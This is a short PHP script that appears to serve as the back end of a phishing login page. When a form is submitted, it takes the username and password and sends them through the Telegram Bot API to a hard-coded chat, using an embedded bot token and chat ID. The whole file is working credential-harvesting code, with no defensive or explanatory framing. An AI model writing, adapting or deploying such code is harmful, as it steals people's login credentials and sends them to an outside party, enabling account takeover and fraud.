<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
    $chatId = '1747742228';
    $message = "👤 Username: $username\n🔐 Password: $password";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
?>
